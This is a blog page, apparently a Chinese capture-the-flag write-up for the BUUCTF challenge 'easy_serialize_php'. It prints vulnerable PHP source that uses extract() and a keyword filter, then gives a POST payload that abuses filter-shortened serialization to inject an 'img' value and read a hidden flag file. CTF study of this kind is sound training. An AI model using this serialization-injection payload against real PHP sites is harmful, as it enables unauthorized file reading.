@@ -1,0 +1,183 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>buuctf17 - 林北</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="[安洵杯 2019]easy_serialize_php打开容器，发现源码：
+123456789101112131415161718192021222324252627282930313233343,"> 
+    <meta name="author" content="linbei"> 
+    <link rel="alternative" href="atom.xml" title="林北" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">林北</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">buuctf17</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">buuctf17</h1>
+        <div class="stuff">
+            <span>七月 27, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E5%88%B7%E9%A2%98/" rel="tag">刷题</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h1 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h1><p>打开容器，发现源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="一-代码审计"><a href="#一-代码审计" class="headerlink" title="一.代码审计"></a>一.代码审计</h4><p>我们大概可以将代码分为两块</p>
+<ul>
+<li><p>通过GET方式获取变量f，将其赋值给<code> $function</code>。</p>
+<p>if语句判断$function的值：1.<code>$function == &#39;highlight_file&#39;</code>，执行<code>highlight_file(&#39;index.php&#39;)</code>；</p>
+<p>​                                              2.<code>$function == &#39;phpinfo&#39;</code>，执行 <code>eval(&#39;phpinfo();&#39;)</code>;</p>
+<p>​                                              3.<code>$function == &#39;show_image&#39;</code>，执行<code>$userinfo = unserialize($serialize_info)</code>;<br>​                                                                                                           <code> echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]))</code>;</p>
+</li>
+<li><p>extract($_POST)将我们POST的数组中的变量导入到当前的符号表。可以实现变量覆盖。</p>
+<p>什么意思呢？举个例子：<em>当我们传入$_SESSION[flag]=123时，$_SESSION[“user”]和$_SESSION[‘function’] 全部会消失，只剩下$_SESSION[flag]=123。</em></p>
+</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a<span class="string">&quot;;s:8:&quot;</span>function<span class="string">&quot;;s:67:&quot;</span><span class="number">1234567</span><span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
